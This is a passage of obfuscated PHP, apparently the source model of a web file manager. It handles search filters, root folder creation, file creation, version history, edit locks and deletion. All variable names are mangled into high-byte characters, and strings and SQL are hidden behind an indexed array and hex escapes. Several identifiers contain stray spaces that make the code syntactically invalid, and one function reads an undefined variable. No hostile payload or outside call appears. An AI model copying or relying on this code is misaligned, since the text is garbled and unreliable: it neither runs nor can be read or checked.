$_SERVER[ò«¥Ê‡å]; $±å½Œ… = array(); $ƒ²ûğÚá = array($‚ƒ°ö‰Ø[182] => $ïßù×®û); $µ¢Ò‘ó¨ = $this->field($‚ƒ°ö‰Ø[2164])->where($ƒ²ûğÚá)->select(); $ÑÑŸÉŞõ = array_to_keyvalue(array_filter_by_field($µ¢Ò‘ó¨, $‚ƒ°ö‰Ø[455], $‚ƒ°ö‰Ø[90]), $‚ƒ°ö‰Ø[12], $‚ƒ°ö‰Ø[183]); $±å½Œ… = array_merge($±å½Œ…, array_to_keyvalue($µ¢Ò‘ó¨, $‚ƒ°ö‰Ø[12], $‚ƒ°ö‰Ø[183])); if (!$ÑÑŸÉŞõ) { return $±å½Œ…; } $ƒ²ûğÚá = array($‚ƒ°ö‰Ø[182] => array($‚ƒ°ö‰Ø[7], $ÑÑŸÉŞõ)); $µ¢Ò‘ó¨ = $this->field($‚ƒ°ö‰Ø[2164])->where($ƒ²ûğÚá)->limit($Ù™ëëî®)->select(); $±å½Œ… = array_merge($±å½Œ…, array_to_keyvalue($µ¢Ò‘ó¨, $‚ƒ°ö‰Ø[12], $‚ƒ°ö‰Ø[183])); $±å½Œ… = array_slice($±å½Œ…, 0, intval($Ù™ëëî®)); return $±å½Œ…; } private function _listSearchBindPinyin($Û³¯’éê, &$ĞÄ™ã¡, &$ËÛé¨œ‰) { $¨åçŸº· =& $_SERVER[ò«¥Ê‡å]; if (!isset($Û³¯’éê[$¨åçŸº·[1993]]) || !$Û³¯’éê[$¨åçŸº·[1993]]) { return; } if (!Input::check($Û³¯’éê[$¨åçŸº·[1993]], $¨åçŸº·[364]) || strlen($Û³¯’éê[$¨åçŸº·[1993]]) < 2) { return; } $®¤Ÿ‘Ì = "\x4c\x45\106\124\40\112\117\x49\116\x20{$this->tablePrefix}\x69\157\137\x73\157\x75\x72\143\145\x5f\x6d\x65\x74\x61\40\155\145\164\141\40\157\156\x20\x73\157\165\162\x63\145\56\x73\x6f\165\x72\x63\x65\111\104\x20\75\x20\x6d\x65\164\x61\56\x73\157\x75\162\x63\x65\x49\x44"; $‹¢ÊâÀ = array(); $ËÛé¨œ‰ = str_replace(array($¨åçŸº·[248], $¨åçŸº·[53], $¨åçŸº·[2165]), $¨åçŸº·[12], $ËÛé¨œ‰); $ËÛé¨œ‰ = $¨åçŸº·[481] . str_replace($¨åçŸº·[50], $¨åçŸº·[482], $ËÛé¨œ‰); $˜½¯¸ª¥ = $ĞÄ™ã¡[$¨åçŸº·[32]]; unset($ĞÄ™ã¡[$¨åçŸº·[32]]); foreach ($ĞÄ™ã¡ as $ß‹½ë·› => $Îœ×İ›‰) { $‹¢ÊâÀ[$¨åçŸº·[481] . $ß‹½ë·›] = $Îœ×İ›‰; } foreach ($˜½¯¸ª¥ as $¥Ò¹¥¦ó) { $‹¢ÊâÀ[] = array($¨åçŸº·[486] => $¥Ò¹¥¦ó, $¨åçŸº·[1047] => $¨åçŸº·[1997], array($¨åçŸº·[2166] => $¥Ò¹¥¦ó, $¨åçŸº·[2167] => array($¨åçŸº·[7], array($¨åçŸº·[508], $¨åçŸº·[507])))); } $this->join($®¤Ÿ‘Ì); $ĞÄ™ã¡ = $‹¢ÊâÀ; } private function _parseSearchWhere($Üô¡òº¹) { $ä”˜¤À =& $_SERVER[ò«¥Ê‡å]; $ÜÊ”ñè = array(); if (isset($Üô¡òº¹[$ä”˜¤À[799]]) && $Üô¡òº¹[$ä”˜¤À[799]]) { $ÜÊ”ñè[$ä”˜¤À[87]] = array($ä”˜¤À[2168], $Üô¡òº¹[$ä”˜¤À[799]]); } if (isset($Üô¡òº¹[$ä”˜¤À[800]]) && $Üô¡òº¹[$ä”˜¤À[800]]) { $×Æ©Ä”­ = array($ä”˜¤À[2169], $Üô¡òº¹[$ä”˜¤À[800]]); if ($ÜÊ”ñè[$ä”˜¤À[87]]) { $ÜÊ”ñè[$ä”˜¤À[87]] = array($ÜÊ”ñè[$ä”˜¤À[87]], $×Æ©Ä”­, $ä”˜¤À[2170]); } else { $ÜÊ”ñè[$ä”˜¤À[87]] = $×Æ©Ä”­; } } if (isset($Üô¡òº¹[$ä”˜¤À[2162]]) && $Üô¡òº¹[$ä”˜¤À[2162]] > 0) { $ÜÊ”ñè[$ä”˜¤À[78]] = array($ä”˜¤À[2168], $Üô¡òº¹[$ä”˜¤À[2162]]); } if (isset($Üô¡òº¹[$ä”˜¤À[2163]]) && $Üô¡òº¹[$ä”˜¤À[2163]]) { $×Æ©Ä”­ = array($ä”˜¤À[2169], $Üô¡òº¹[$ä”˜¤À[2163]]); if ($ÜÊ”ñè[$ä”˜¤À[78]]) { $ÜÊ”ñè[$ä”˜¤À[78]] = array($ÜÊ”ñè[$ä”˜¤À[78]], $×Æ©Ä”­, $ä”˜¤À[2170]); } else { $ÜÊ”ñè[$ä”˜¤À[78]] = $×Æ©Ä”­; } } if (isset($Üô¡òº¹[$ä”˜¤À[632]]) && $Üô¡òº¹[$ä”˜¤À[632]]) { $ÜÊ”ñè[] = array($ä”˜¤À[499] => $Üô¡òº¹[$ä”˜¤À[632]], $ä”˜¤À[497] => $Üô¡òº¹[$ä”˜¤À[632]], $ä”˜¤À[1047] => $ä”˜¤À[1997]); } if (isset($Üô¡òº¹[$ä”˜¤À[456]]) && $Üô¡òº¹[$ä”˜¤À[456]]) { $½ïÙ³ôŠ = $Üô¡òº¹[$ä”˜¤À[456]]; if ($½ïÙ³ôŠ == $ä”˜¤À[77]) { $ÜÊ”ñè[$ä”˜¤À[455]] = 1; } else { if ($½ïÙ³ôŠ == $ä”˜¤À[2171]) { $ÜÊ”ñè[$ä”˜¤À[455]] = 0; } else { if ($½ïÙ³ôŠ) { $½ïÙ³ôŠ = is_array($½ïÙ³ôŠ) ? $½ïÙ³ôŠ : explode($ä”˜¤À[50], $½ïÙ³ôŠ); $ÜÊ”ñè[$ä”˜¤À[456]] = array($ä”˜¤À[462], $½ïÙ³ôŠ); $ÜÊ”ñè[$ä”˜¤À[455]] = 0; } } } } $this->_parseSearchParent($Üô¡òº¹, $ÜÊ”ñè); if (isset($Üô¡òº¹[$ä”˜¤À[1993]]) && trim($Üô¡òº¹[$ä”˜¤À[1993]])) { $Õ›–¤şª = trim($Üô¡òº¹[$ä”˜¤À[1993]]); $õ’‹èÈ = explode($ä”˜¤À[53], $Õ›–¤şª); if (strlen($Õ›–¤şª) > 2 && (substr($Õ›–¤şª, 0, 1) == $ä”˜¤À[120] && substr($Õ›–¤şª, -1) == $ä”˜¤À[120]) || substr($Õ›–¤şª, 0, 1) == $ä”˜¤À[58] && substr($Õ›–¤şª, -1) == $ä”˜¤À[58]) { $Õ›–¤şª = substr($Õ›–¤şª, 1, -1); $õ’‹èÈ = array($Õ›–¤şª); } $ÜÊ”ñè[$ä”˜¤À[32]] = array(array($ä”˜¤À[582], $ä”˜¤À[1995] . $Õ›–¤şª . $ä”˜¤À[1995])); if (count($õ’‹èÈ) > 1) { $ÜÊ”ñè[$ä”˜¤À[32]] = array(); foreach ($õ’‹èÈ as $¨è”ª·ø) { if (!trim($¨è”ª·ø)) { continue; } $ÜÊ”ñè[$ä”˜¤À[32]][] = array($ä”˜¤À[582], $ä”˜¤À[1995] . trim($¨è”ª·ø) . $ä”˜¤À[1995]); } } } return $ÜÊ”ñè; } private function _parseSearchParent($‚™Š”â¢, &$½ƒµàô¨) { $ñ‰’óç =& $_SERVER[ò«¥Ê‡å]; if (!isset($‚™Š”â¢[$ñ‰’óç[182]]) || !$‚™Š”â¢[$ñ‰’óç[182]]) { return; } $Î…Îíå = $this->pathInfo($‚™Š”â¢[$ñ‰’óç[182]]); $×º„ùÎ = $Î…Îíå[$ñ‰’óç[182]] . $ñ‰’óç[12] === $ñ‰’óç[214]; $¾¡¥òï¸ = $Î…Îíå[$ñ‰’óç[180]] == $ñ‰’óç[549]; if ($Î…Îíå[$ñ‰’óç[566]] == $ñ‰’óç[567]) { $úçéˆñæ = $this->sourceInfo($‚™Š”â¢[$ñ‰’óç[182]]); $Î…Îíå[$ñ‰’óç[555]] = $úçéˆñæ[$ñ‰’óç[555]]; } $½ƒµàô¨[$ñ‰’óç[622]] = array($ñ‰’óç[582], $Î…Îíå[$ñ‰’óç[555]] . $‚™Š”â¢[$ñ‰’óç[182]] . $ñ‰’óç[583]); $Êû¨ƒŒ± = isset($‚™Š”â¢[$ñ‰’óç[1858]]) && in_array($ñ‰’óç[549], $‚™Š”â¢[$ñ‰’óç[1858]]); if (!$Êû¨ƒŒ± || !$¾¡¥òï¸ || !$×º„ùÎ || !$Î…Îíå[$ñ‰’óç[457]]) { return; } if (!AuthModel::authCheckRoot($Î…Îíå[$ñ‰’óç[457]][$ñ‰’óç[458]])) { return; } $¼í·¢ìä = $Î…Îíå[$ñ‰’óç[540]] . $ñ‰’óç[12]; if ($¼í·¢ìä == $ñ‰’óç[90]) { unset($½ƒµàô¨[$ñ‰’óç[622]]); $½ƒµàô¨[$ñ‰’óç[180]] = self::TYPE_GROUP; return; } $ä›ß¨¯Á = Model($ñ‰’óç[556])->groupChildrenAll($¼í·¢ìä); $Î¨èÏŸ³ = count($ä›ß¨¯Á); if ($Î¨èÏŸ³ <= 1) { return; } $¡ÅÜ‚–ã = array($ñ‰’óç[182] => 0, $ñ‰’óç[180] => self::TYPE_GROUP, $ñ‰’óç[540] => array($ñ‰’óç[7], $ä›ß¨¯Á)); $½Åš»¹Ä = $this->field($ñ‰’óç[2172])->where($¡ÅÜ‚–ã)->limit($Î¨èÏŸ³)->select(); $½ƒµàô¨[$ñ‰’óç[622]] = array(); foreach ($½Åš»¹Ä as $ÆõåØ€®) { $½ƒµàô¨[$ñ‰’óç[622]][] = array($ñ‰’óç[582], $ñ‰’óç[565] . $ÆõåØ€®[$ñ‰’óç[183]] . $ñ‰’óç[583]); } $½ƒµàô¨[$ñ‰’óç[622]][] = $ñ‰’óç[1997]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ì™¬¡Ğú) { $‡ñØÓÙ³ =& $_SERVER[ò«¥Ê‡å]; $¿ËíâÀ = Model($‡ñØÓÙ³[548])->where(array($‡ñØÓÙ³[1692] => $ì™¬¡Ğú))->find(); $¸Ş¡ğìÙ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ì™¬¡Ğú, $¿ËíâÀ[$‡ñØÓÙ³[32]]); $this->userDesktopAdd($¸Ş¡ğìÙ); return $¸Ş¡ğìÙ; } public function userDesktopAdd($ÓÈ¨é–Ñ) { $İÉ»¢å =& $_SERVER[ò«¥Ê‡å]; $ÙÜ©ÁĞ = LNG($İÉ»¢å[2173]); $¬¿İÅÌ‰ = $this->mkdir($ÓÈ¨é–Ñ, $ÙÜ©ÁĞ); $this->metaSet($¬¿İÅÌ‰, $İÉ»¢å[2174], $İÉ»¢å[90]); $this->metaSet($ÓÈ¨é–Ñ, $İÉ»¢å[2175], $¬¿İÅÌ‰); } public function userPathSafeAdd($ÛÄŞ Èú) { $û„¸¤Ÿ =& $_SERVER[ò«¥Ê‡å]; $¶Çğ˜¨ = Model($û„¸¤Ÿ[548])->getInfoFull($ÛÄŞ Èú); if (!$¶Çğ˜¨) { return !1; } if (_get($¶Çğ˜¨, $û„¸¤Ÿ[570])) { return $¶Çğ˜¨[$û„¸¤Ÿ[509]][$û„¸¤Ÿ[2176]]; } $«°‘±Î = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÛÄŞ Èú, $û„¸¤Ÿ[2177], $û„¸¤Ÿ[476]); Model($û„¸¤Ÿ[548])->metaSet($ÛÄŞ Èú, $û„¸¤Ÿ[2176], $«°‘±Î); $this->metaSet($«°‘±Î, $û„¸¤Ÿ[2178], $ÛÄŞ Èú); return $«°‘±Î; } public function groupRootAdd($Õº­Èâ) { $ü§áğ¦ =& $_SERVER[ò«¥Ê‡å]; $ú¤±ˆ×Ç = Model($ü§áğ¦[556])->where(array($ü§áğ¦[1987] => $Õº­Èâ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Õº­Èâ, $ú¤±ˆ×Ç[$ü§áğ¦[32]]); } public function systemRootPathAdd($ÚÓ“¬‰–) { if ($ÚÓ“¬‰– != $_SERVER[ò«¥Ê‡å][576]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÚÓ“¬‰–); } public function userRootRemove($£¢…¹æÎ) { $«»®Ö¤ = $this->targetSourceRoot(SourceModel::TYPE_USER, $£¢…¹æÎ, !0); foreach ($«»®Ö¤ as $×õŸ©à) { if (!$×õŸ©à) { continue; } $this->remove($×õŸ©à[$_SERVER[ò«¥Ê‡å][183]], !1); } } public function groupRootRemove($ÚõÉÖ÷) { $Ò¯Ìİ¬Û = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÚõÉÖ÷); if (!$Ò¯Ìİ¬Û) { return; } $this->remove($Ò¯Ìİ¬Û[$_SERVER[ò«¥Ê‡å][183]], !1); } private function _mkdirRoot($Õ ‡ª÷Ù, $õÙ³ïˆ‘, $­½å±…õ, $Ôø¬û± = '') { $—Ç—™Ïí =& $_SERVER[ò«¥Ê‡å]; $üûìÅûß = defined($—Ç—™Ïí[2121]) ? USER_ID : 0; $±×‹»Åø = array($—Ç—™Ïí[447] => 0, $—Ç—™Ïí[618] => $Õ ‡ª÷Ù, $—Ç—™Ïí[619] => $õÙ³ïˆ‘, $—Ç—™Ïí[616] => 1, $—Ç—™Ïí[620] => $üûìÅûß, $—Ç—™Ïí[621] => $üûìÅûß, $—Ç—™Ïí[617] => $Ôø¬û±, $—Ç—™Ïí[622] => $—Ç—™Ïí[565], $—Ç—™Ïí[474] => 0, $—Ç—™Ïí[587] => 0, $—Ç—™Ïí[512] => 0, $—Ç—™Ïí[623] => $—Ç—™Ïí[12]); if ($áêâıáÓ = $this->where($±×‹»Åø)->find()) { return $áêâıáÓ[$—Ç—™Ïí[183]]; } $ğ®Ò’¥ = "\115\157\x64\145\x6c\123\157\165\x72\x63\145\x2e\x6d\153\x64\x69\162\x52\157\x6f\164\x2e{$Õ ‡ª÷Ù}\56{$õÙ³ïˆ‘}\56" . $­½å±…õ; CacheLock::lock($ğ®Ò’¥); $±×‹»Åø[$—Ç—™Ïí[32]] = $­½å±…õ; $—ÇŠ©ğ» = $this->add($±×‹»Åø); $–â²Öà‚ = array($—Ç—™Ïí[624] => short_id($—ÇŠ©ğ»)); $this->where(array($—Ç—™Ïí[461] => $—ÇŠ©ğ»))->save($–â²Öà‚); CacheLock::unlock($ğ®Ò’¥); return $—ÇŠ©ğ»; } private function targetSourceRoot($¯Ş·¼Š, $ü­èöß›, $ûêò»ñ¢ = false) { $¿Í¯Çùï =& $_SERVER[ò«¥Ê‡å]; $ª©š€Ûà = array($¿Í¯Çùï[447] => 0, $¿Í¯Çùï[618] => $¯Ş·¼Š, $¿Í¯Çùï[619] => $ü­èöß›); if ($ûêò»ñ¢) { $€¡–ïá÷ = $this->where($ª©š€Ûà)->select(); return $€¡–ïá÷ ? $€¡–ïá÷ : array(); } $½É±ÇŞÊ = $this->where($ª©š€Ûà)->find(); return $½É±ÇŞÊ ? $½É±ÇŞÊ : array(); } public function sourceRootGroup($¥®›ÅğÚ) { $º¦Ó¢ÕÎ =& $_SERVER[ò«¥Ê‡å]; if (is_string($¥®›ÅğÚ)) { $¥®›ÅğÚ = array($¥®›ÅğÚ); } $˜ôÆ½èÑ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $¥®›ÅğÚ, $º¦Ó¢ÕÎ[205]); $„ëşÂÀÁ = array($º¦Ó¢ÕÎ[415] => $˜ôÆ½èÑ, $º¦Ó¢ÕÎ[412] => array($º¦Ó¢ÕÎ[797] => count($¥®›ÅğÚ))); $this->_listDataApply($„ëşÂÀÁ[$º¦Ó¢ÕÎ[415]]); $this->_listMake($„ëşÂÀÁ); return array_to_keyvalue($„ëşÂÀÁ[$º¦Ó¢ÕÎ[84]], $º¦Ó¢ÕÎ[540]); } public function mkfile($‰šÙƒ¶, $ú£˜æ¯†, $ˆõøÓ¦Ô = '', $ÓÚÑëÆƒ = REPEAT_RENAME) { $×´ôÑÓ =& $_SERVER[ò«¥Ê‡å]; $àÕÊ”¡™ = Model($×´ôÑÓ[644])->addFileByContent($ˆõøÓ¦Ô, $ú£˜æ¯†); return $this->_createFileCall($‰šÙƒ¶, $ú£˜æ¯†, $àÕÊ”¡™, $ÓÚÑëÆƒ, $×´ôÑÓ[1390]); } public function addFile($¥¤–âë, $±‘¸ó€, $Øïæû…, $ßãÊÃÔ† = false, $àÂ·Ö™á = REPEAT_RENAME) { $ÄáÚéä = Model($_SERVER[ò«¥Ê‡å][644])->addFile($±‘¸ó€, $Øïæû…, $ßãÊÃÔ†); return $this->_createFileCall($¥¤–âë, $Øïæû…, $ÄáÚéä, $àÂ·Ö™á); } public function addFileByFileID($¶¬õï¾, $©Ç»şÊª, $áÁ‰¾ò, $õ– €¬ = REPEAT_RENAME) { $î¡»ï =& $_SERVER[ò«¥Ê‡å]; $å–ŞÉŒÀ = Model($î¡»ï[644])->find($©Ç»şÊª); Model($î¡»ï[644])->linkAdd($©Ç»şÊª); return $this->_createFileCall($¶¬õï¾, $áÁ‰¾ò, $å–ŞÉŒÀ, $õ– €¬); } public function addFileByRemote($æÈ‚îØ, $²ºÍ„Æ, $ú•Ó ™ï, $›ÉÜ¥ò = array(), $ƒ„ü¸î = REPEAT_RENAME) { $ñÕ„‡˜¼ = Model($_SERVER[ò«¥Ê‡å][644])->addFileByRemote($²ºÍ„Æ, $ú•Ó ™ï, $›ÉÜ¥ò); return $this->_createFileCall($æÈ‚îØ, $ú•Ó ™ï, $ñÕ„‡˜¼, $ƒ„ü¸î); } private function _createFileCall($ñì¯„Û†, $Ú´ŞÒ¼è, $Ú£Õƒû, $¡®ÏİÓ€, $©øâ€” = "\x75\x70\x6c\x6f\141\x64") { $ÅŞêüÉ÷ =& $_SERVER[ò«¥Ê‡å]; $–î‚ÆØ = !1; $this->setMasterDB(); $this->lockWriteStart($ñì¯„Û†, $Ú´ŞÒ¼è); $œÇÓê Ó = $this->fileNameExist($ñì¯„Û†, $Ú´ŞÒ¼è); $Â­ƒ¬ßÀ = $this->_createFile($ñì¯„Û†, $Ú´ŞÒ¼è, $Ú£Õƒû, $¡®ÏİÓ€, $–î‚ÆØ); if (!$–î‚ÆØ) { Model($ÅŞêüÉ÷[514])->remove($Ú£Õƒû[$ÅŞêüÉ÷[511]]); } if ($–î‚ÆØ && $Â­ƒ¬ßÀ && $Â­ƒ¬ßÀ != $œÇÓê Ó) { Model($ÅŞêüÉ÷[2146])->eventCreate($Â­ƒ¬ßÀ, $©øâ€”); } $this->lockWriteEnd($ñì¯„Û†, $Ú´ŞÒ¼è); return $Â­ƒ¬ßÀ; } public function mkdir($˜ì´ùƒŸ, $Ô·şÙİ¬, $ò×ÊÃˆ = REPEAT_SKIP) { $ßÙŸéÍÕ =& $_SERVER[ò«¥Ê‡å]; $this->setMasterDB(); $—Ï„ı¸° = $this->sourceInfo($˜ì´ùƒŸ); if (!$—Ï„ı¸°) { return !1; } $this->lockWriteStart($˜ì´ùƒŸ, $Ô·şÙİ¬); if ($ò×ÊÃˆ !== !1) { $Â¶ó¦ø¡ = $this->fileNameExist($˜ì´ùƒŸ, $Ô·şÙİ¬); if ($Â¶ó¦ø¡ && $ò×ÊÃˆ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($˜ì´ùƒŸ, $Ô·şÙİ¬); return $Â¶ó¦ø¡; } $Ô·şÙİ¬ = $this->fileNameAuto($˜ì´ùƒŸ, $Ô·şÙİ¬, $ò×ÊÃˆ); } $Ä’âÍÎÉ = array($ßÙŸéÍÕ[616] => 1, $ßÙŸéÍÕ[464] => $Ô·şÙİ¬, $ßÙŸéÍÕ[617] => $ßÙŸéÍÕ[12], $ßÙŸéÍÕ[512] => 0, $ßÙŸéÍÕ[587] => 0); $¡×Á·¢Ö = $this->_addSource($Ä’âÍÎÉ, $—Ï„ı¸°); Model($ßÙŸéÍÕ[2146])->eventCreate($¡×Á·¢Ö, $ßÙŸéÍÕ[1391]); $this->lockWriteEnd($˜ì´ùƒŸ, $Ô·şÙİ¬); return $¡×Á·¢Ö; } public function listSourceRoot($êçİ“êâ, $ì¶»€¥û, $©§¾ØÀ¢ = "\x73\x6f\165\x72\143\145\111\x44\54\x74\x61\x72\x67\x65\x74\x49\104\x2c\x73\151\172\145") { $¯¾éâçë =& $_SERVER[ò«¥Ê‡å]; $¬Å²ÈÚ® = $¯¾éâçë[424]; $—¥ıœõ¶ = array(); $úÕêç¸¥ = 1024 * 50; $Íã¥à«¸ = is_array($Íã¥à«¸) ? $Íã¥à«¸ : array(); $îÔ—ø³ = count($ì¶»€¥û); $ÔÃ¿¿é = $this->tablePrefix . $¯¾éâçë[2179]; for ($³óĞ©î· = 0; $³óĞ©î· < $îÔ—ø³; $³óĞ©î·++) { $¯¿Ú±„Ÿ = $ì¶»€¥û[$³óĞ©î·]; $¬Å²ÈÚ® .= "\123\105\x4c\105\x43\x54\40\52\x20\x46\122\117\115\40\50\123\105\114\x45\x43\x54\40{$©§¾ØÀ¢}\x20\x46\x52\x4f\115\40\x60{$ÔÃ¿¿é}\x60\40\127\110\x45\122\105\x20"; $¬Å²ÈÚ® .= "\x60\x70\x61\162\145\156\x74\x49\x44\x60\75\60\40\101\x4e\x44\x20\140\x74\141\162\x67\145\164\x49\104\x60\x3d{$¯¿Ú±„Ÿ}\40\101\116\104\40\140\164\x61\162\x67\x65\164\x54\x79\160\x65\140\x3d{$êçİ“êâ}\x20\141\x6e\144\x20\x66\x69\x6c\145\124\171\160\145\75\47\47\40\x6c\151\155\151\x74\x20\61\x29\x20\x61\x73\40\x74\142\x5f{$³óĞ©î·}\x20\x55\116\x49\x4f\116\x20\101\114\x4c\40"; if ((strlen($¬Å²ÈÚ®) >= $úÕêç¸¥ || $³óĞ©î· == $îÔ—ø³ - 1) && $¬Å²ÈÚ®) { $¬Å²ÈÚ® = substr($¬Å²ÈÚ®, 0, -strlen($¯¾éâçë[1085])); $µ ºéÕà = $this->query($¬Å²ÈÚ®); $¬Å²ÈÚ® = $¯¾éâçë[12]; $—¥ıœõ¶ = array_merge($—¥ıœõ¶, $µ ºéÕà); } } return $—¥ıœõ¶; } private function _createFile($şÔ†µ˜ò, $Í¾†§õ«, $ÈÓ†Í‹å, $âÂÌãí©, &$ÈğõÚı) { $¬¡÷ûç¢ =& $_SERVER[ò«¥Ê‡å]; $Ú‹‚—Ö¨ = $this->sourceInfo($şÔ†µ˜ò); if (!$ÈÓ†Í‹å || !$Ú‹‚—Ö¨) { return !1; } if ($âÂÌãí© !== !1) { $‡±áğ£‘ = $this->fileNameExist($şÔ†µ˜ò, $Í¾†§õ«); } $ÈğõÚı = !0; if ($âÂÌãí© && $‡±áğ£‘) { if ($âÂÌãí© == REPEAT_SKIP) { $ÈğõÚı = !1; return $‡±áğ£‘; } else { if ($âÂÌãí© == REPEAT_REPLACE) { $şàŸ¨şƒ = $this->sourceInfo($‡±áğ£‘); $‘µ„ÀÈŒ = $this->fileHistory($şàŸ¨şƒ, $ÈÓ†Í‹å[$¬¡÷ûç¢[511]], $ÈÓ†Í‹å[$¬¡÷ûç¢[78]]); if (!$‘µ„ÀÈŒ) { $ÈğõÚı = !1; } else { $this->folderSizeReset($şÔ†µ˜ò); } return $‡±áğ£‘; } else { $Í¾†§õ« = $this->fileNameAuto($şÔ†µ˜ò, $Í¾†§õ«, $âÂÌãí©, !1); } } } $“àİÜ„Â = array($¬¡÷ûç¢[616] => 0, $¬¡÷ûç¢[464] => $Í¾†§õ«, $¬¡÷ûç¢[617] => substr(get_path_ext($Í¾†§õ«), 0, 10), $¬¡÷ûç¢[512] => $ÈÓ†Í‹å[$¬¡÷ûç¢[511]], $¬¡÷ûç¢[587] => $ÈÓ†Í‹å[$¬¡÷ûç¢[78]]); $£¿ÉÉ¥œ = $this->_addSource($“àİÜ„Â, $Ú‹‚—Ö¨); $this->folderSizeReset($şÔ†µ˜ò, intval($“àİÜ„Â[$¬¡÷ûç¢[78]])); return $£¿ÉÉ¥œ; } protected function fileHistory($³ı’Ï¬ë, $ú×“Ì›, $“‚©ˆÊì) { $Æåº™¯ =& $_SERVER[ò«¥Ê‡å]; if ($³ı’Ï¬ë[$Æåº™¯[511]] == $ú×“Ì›) { return !1; } $this->checkLock($³ı’Ï¬ë[$Æåº™¯[183]], $ú×“Ì›); Model($Æåº™¯[2180])->addHistory($³ı’Ï¬ë); $‚ƒŸÔÃ½ = array($Æåº™¯[621] => USER_ID, $Æåº™¯[468] => time(), $Æåº™¯[511] => $ú×“Ì›, $Æåº™¯[78] => $“‚©ˆÊì); $this->where(array($Æåº™¯[461] => $³ı’Ï¬ë[$Æåº™¯[183]]))->save($‚ƒŸÔÃ½); $this->sourceCacheClear($³ı’Ï¬ë[$Æåº™¯[183]]); return !0; } public function checkLock($¤—Îàş¼, $·ËÎÍªŸ) { $˜·ä—¦¸ =& $_SERVER[ò«¥Ê‡å]; $Ñ°’÷ˆ = $this->pathInfo($¤—Îàş¼); if (!$this->fileIsLock($Ñ°’÷ˆ, !0)) { return; } $Ç´•á½­ = Session::get($˜·ä—¦¸[2181]); $™¬èçïÈ = substr($Ñ°’÷ˆ[$˜·ä—¦¸[32]], 0, -1 - strlen($Ñ°’÷ˆ[$˜·ä—¦¸[177]])) . $˜·ä—¦¸[1255] . $Ç´•á½­ . $˜·ä—¦¸[10] . $Ñ°’÷ˆ[$˜·ä—¦¸[177]]; $¾¸éÎ´Ÿ = Model($˜·ä—¦¸[644])->find($·ËÎÍªŸ); $this->_createFileCall($Ñ°’÷ˆ[$˜·ä—¦¸[182]], $™¬èçïÈ, $¾¸éÎ´Ÿ, REPEAT_REPLACE, $˜·ä—¦¸[1390]); $Ï¼’„²û = $Ñ°’÷ˆ[$˜·ä—¦¸[509]][$˜·ä—¦¸[580]]; $ Ó±ÌÁ¢ = $Ï¼’„²û[$˜·ä—¦¸[2182]] ? $Ï¼’„²û[$˜·ä—¦¸[2182]] : $Ï¼’„²û[$˜·ä—¦¸[32]]; show_json(LNG($˜·ä—¦¸[2183]) . $˜·ä—¦¸[2184] . LNG($˜·ä—¦¸[2185]) . $˜·ä—¦¸[2186] . $ Ó±ÌÁ¢ . $˜·ä—¦¸[2187], !1); } public function fileIsLock($ÀĞúµò¥, $Åµì‚Ş­ = false) { $•ı´ÂçÈ =& $_SERVER[ò«¥Ê‡å]; if (!isset($ÀĞúµò¥[$•ı´ÂçÈ[509]]) || !$ÀĞúµò¥[$•ı´ÂçÈ[509]][$•ı´ÂçÈ[577]]) { return !1; } if ($ÀĞúµò¥[$•ı´ÂçÈ[509]][$•ı´ÂçÈ[577]] != USER_ID) { return !0; } $è¹âßæ³ = $GLOBALS[$•ı´ÂçÈ[6]][$•ı´ÂçÈ[91]][$•ı´ÂçÈ[578]]; if ($ÀĞúµò¥[$•ı´ÂçÈ[509]][$•ı´ÂçÈ[579]] <= time() - $è¹âßæ³) { $this->metaSet($ÀĞúµò¥[$•ı´ÂçÈ[183]], $•ı´ÂçÈ[577], null); $this->metaSet($ÀĞúµò¥[$•ı´ÂçÈ[183]], $•ı´ÂçÈ[579], null); } if ($Åµì‚Ş­) { $this->metaSet($ÀĞúµò¥[$•ı´ÂçÈ[183]], $•ı´ÂçÈ[579], time()); } return !1; } private function _addSource($ûÒ½øş€, $øÄŠŠ³) { $™“÷øê• =& $_SERVER[ò«¥Ê‡å]; $ŒŠ£µšÓ = defined($™“÷øê•[2121]) ? USER_ID : 0; $Ç—¹Õº¡ = array($™“÷øê•[618] => $øÄŠŠ³[$™“÷øê•[180]], $™“÷øê•[619] => $øÄŠŠ³[$™“÷øê•[540]], $™“÷øê•[620] => $ŒŠ£µšÓ, $™“÷øê•[621] => $ŒŠ£µšÓ, $™“÷øê•[447] => $øÄŠŠ³[$™“÷øê•[183]], $™“÷øê•[622] => $øÄŠŠ³[$™“÷øê•[555]] . $øÄŠŠ³[$™“÷øê•[183]] . $™“÷øê•[50], $™“÷øê•[474] => 0, $™“÷øê•[623] => $™“÷øê•[12]); $ûÒ½øş€ = array_merge($Ç—¹Õº¡, $ûÒ½øş€); $this->updateModifyTime($ûÒ½øş€[$™“÷øê•[182]]); $£—Ğİâ» = $™“÷øê•[2188] . $øÄŠŠ³[$™“÷øê•[183]]; if (isset(self::$cacheChildList[$£—Ğİâ»])) { unset(self::$cacheChildList[$£—Ğİâ»]); } static $ÙŠòÜŸÜ = false; if (!$ÙŠòÜŸÜ) { Hook::trigger($™“÷øê•[606], $ûÒ½øş€); $ÙŠòÜŸÜ = !0; } $ªË§ºù¯ = $this->add($ûÒ½øş€); $°©œôô‡ = array($™“÷øê•[624] => short_id($ªË§ºù¯)); $this->where(array($™“÷øê•[461] => $ªË§ºù¯))->save($°©œôô‡); $this->setNamePinyin($ªË§ºù¯, $ûÒ½øş€[$™“÷øê•[32]]); return $ªË§ºù¯; } public function remove($Ö«’úúõ, $Ê©ğÉÌÊ = true) { $øœÑ·Ú“ =& $_SERVER[ò«¥Ê‡å]; $ì¬‘›¯Ê = $this->sourceInfo($Ö«’úúõ); $Èúù´Ê = intval($ì¬‘›¯Ê[$øœÑ·Ú“[180]]) === self::TYPE_SYSTEM; $€“¯³ô = Model($øœÑ·Ú“[478])->get($øœÑ·Ú“[2189]) == $øœÑ·Ú“[90]; if ($Èúù´Ê || $Ê©ğÉÌÊ || !$€“¯³ô) { return $this->removeNow($Ö«’úúõ, $Ê©ğÉÌÊ); } $åºÒ†É = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÜÖæÑ¡• = 